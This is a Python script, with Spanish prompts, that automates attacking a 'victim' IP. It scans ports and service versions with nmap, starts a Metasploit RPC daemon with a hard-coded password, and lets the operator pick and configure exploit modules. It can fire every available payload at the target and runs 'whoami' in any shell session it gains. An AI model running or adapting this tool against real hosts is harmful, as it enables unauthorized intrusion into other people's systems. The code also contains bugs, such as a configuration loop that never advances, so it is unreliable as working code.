from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod
import nmap
import subprocess
import re
import time
import os

nm = nmap.PortScanner()

print("Introduce la IP de la victima")
ip_victima = input()

print("Introduce los puertos: Ejemplo: Varios puertos:22,80,8080/Rango:22-443")
puertos=input()

print("Escaneando , espere")

nm.scan(ip_victima, puertos)
print(nm.scaninfo())
print(nm.command_line())
print(nm.csv())
print(nm.all_hosts())

for host in nm.all_hosts():
    print('----------------------------------------------------')
    print('Host : %s (%s)' % (host, nm[host].hostname()))
    print('Estado : %s' % nm[host].state())
    for proto in nm[host].all_protocols():
        print('----------')
        print('Protocolo : %s' % proto)

        lport = nm[host][proto].keys()
        for port in lport:
            print ('Puerto : %s\t estado : %s' % (port, nm[host][proto][port]['state']))

print("Introduce los puertos de los que quieres obtener informacion: ,(cuando ya no quieras introducir mas introduce el 0)" )
e=1
lista=[]
while(e==1):
    puertoInfo=int(input())
    if(puertoInfo!=0):
        lista.append(puertoInfo)
    else:
        e=0
        print("recopilando información, espere")


resultado=nm.scan(host, puertos)
for i in lista:
    print(f"para el puerto  {i}  el servicio es: {resultado['scan'][ip_victima]['tcp'][i]['product']}")
    print(f"para el puerto {i}  la version es es: {resultado['scan'][ip_victima]['tcp'][i]['version']}")


def serverconnect():
    stream = os.popen('netstat -tulpn | grep 55553')
    output = stream.read()
    output
    if output.find('55553') == -1:
        subprocess.run("msfrpcd -P user -U msf -S", shell=True)


def cliente():
    cliente = MsfRpcClient('user', port=55553)
    return cliente

def exploit(cliente):
    i=0
    lista = cliente.modules.exploits

    print("-----------------------------")
    print("Modulo Metaesploit Cargado")
    print("-----------------------------")
    print("Introduce al menos dos palabras clave a buscar para mostrar los posibles exploits")
    print("Primera pablabra:")
    clave1=input()
    print("Segunda pablabra:")
    clave2=input()

    for m in lista:
        if clave1 in m:
            if clave2 in m:
                print(m)

    print("-----------------------------")
    print("Selecciona un exploit")
    exploit_seleccionado = input()
    exploit = cliente.modules.use('exploit', exploit_seleccionado)

    print(f'Configuracion necesaria: {exploit.missing_required}')

    while(i < len(exploit.missing_required)):
        print(f'Introduce la configuracion: {exploit.missing_required[i]}')
        conf=input()
        exploit[exploit.missing_required[i]] = conf


    print(f'Configuracion necesaria: {exploit.missing_required}')
    if(len(exploit.missing_required) == 0):
        print("Todo configurado")

    print("-----------------------------")
    print("Estos son los Payloads disponibles para este exploit")
    print("-----------------------------")

    j=0
    for i in exploit.payloads:
        print(f'{j}. {i}')
        j+=1

    print("Lanzar todo pulsa 1 / Seleccionar tu el payload pulsa 2")
    seleccion = int(input())
    if(seleccion == 1):
        for i in exploit.payloads:
            exploit.execute(payload=i)
            print(cliente.jobs.list)
    else:
        print("------------------------")
        print("Selecciona un payload")
        payload_seleccionado=input()

        payload = cliente.modules.use('payload', payload_seleccionado)

        exploit.execute(payload=payload)

    print(cliente.jobs.list)
    time.sleep(50)

    print('terminado!')

    if not cliente.sessions.list:
        print('no hay sesiones activas aun')
    else:
        for session_id in cliente.sessions:
            print (cliente.sessions)
            shell = cliente.sessions.session(session_id)
            shell.write('whoami')

serverconnect()

cliente = cliente()
exploit(cliente)
